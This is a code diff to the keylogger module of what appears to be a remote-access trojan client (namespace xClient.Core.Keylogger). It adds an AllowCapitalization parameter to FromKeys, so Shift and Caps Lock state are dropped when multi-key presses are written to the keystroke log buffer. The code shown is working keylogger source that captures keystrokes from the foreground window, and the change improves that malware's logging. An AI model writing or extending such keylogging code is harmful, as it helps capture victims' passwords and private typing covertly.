@@ -174,7 +174,7 @@ namespace xClient.Core.Keylogger
                                 // The pressed key is not special, but we have encountered
                                 // a situation of multiple key presses, so just build them.
                                 _logFileBuffer.Append(HighlightSpecialKey(k.ModifierKeys.BuildString() +
-                                                      FromKeys(k)));
+                                                      FromKeys(k, false)));
                             }
                         }
                         // We don't have to worry about nearly all modifier keys...
@@ -312,13 +312,13 @@ namespace xClient.Core.Keylogger
             return Win32.GetKeyboardLayout(Win32.GetWindowThreadProcessId(Win32.GetForegroundWindow(), out pid));
         }
 
-        private char? FromKeys(LoggedKey key)
+        private char? FromKeys(LoggedKey key, bool AllowCapitalization = true)
         {
             //keyStates is a byte array that specifies the current state of the keyboard and keys
             //The keys we are interested in are modifier keys such as shift and caps lock
             byte[] keyStates = new byte[256];
 
-            if (key.ModifierKeys.ShiftKeyPressed)
+            if (key.ModifierKeys.ShiftKeyPressed && AllowCapitalization)
                 keyStates[(int) KeyloggerKeys.VK_SHIFT] = 0x80;
 
             if (key.ModifierKeys.AltKeyPressed)
@@ -327,7 +327,7 @@ namespace xClient.Core.Keylogger
             if (key.ModifierKeys.CtrlKeyPressed)
                 keyStates[(int) KeyloggerKeys.VK_CONTROL] = 0x80;
 
-            if (key.ModifierKeys.CapsLock)
+            if (key.ModifierKeys.CapsLock && AllowCapitalization)
                 keyStates[(int) KeyloggerKeys.VK_CAPITAL] = 0x01;
 
             if (key.ModifierKeys.ScrollLock)
